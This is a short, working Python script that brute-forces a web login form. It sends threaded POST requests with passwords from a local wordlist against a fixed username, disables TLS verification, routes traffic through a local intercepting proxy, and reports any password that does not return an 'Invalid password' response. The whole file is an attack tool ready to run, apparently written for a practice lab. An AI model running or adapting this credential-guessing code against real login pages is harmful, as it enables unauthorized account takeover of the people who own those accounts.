import requests
import sys
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def postRequest(s, target_url, password):
    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
    params = {
        'username' : 'nona',
        'password' : password
    }

    # SEND REQUEST
    r = s.post(target_url, data=params, verify=False, proxies=proxies)

    # CHECK IF PASSWORD IS VALID
    if "Invalid password" not in r.text:
        return password, r.status_code



def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of arguments!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    target_url = url + '/login'
    passwords = []
    
    # LOAD PASSWORDS IN A LIST
    with open(r'.\passwords.txt', 'r') as file:
        print("[+] Loading all passwords in a list...")
        for line in file.readlines():
            password = line.strip()
            sys.stdout.write("[+] Added passwords %s\r" % password)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            passwords.append(password)
        
    how_many_passwords = len(passwords)
    print("[+] All set! %i passwords loaded" % how_many_passwords)

    # START THREADED EXECUTION

    with ThreadPoolExecutor (max_workers=5) as executor:
        future_to_url = {executor.submit(postRequest, s, target_url, password) for password in passwords}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                
                    data = future.result()
                    if data:
                        print(data[0], data[1])
                

            except Exception as exc:
                print("[-] Error: %s" % exc)

if __name__ == "__main__":
    main()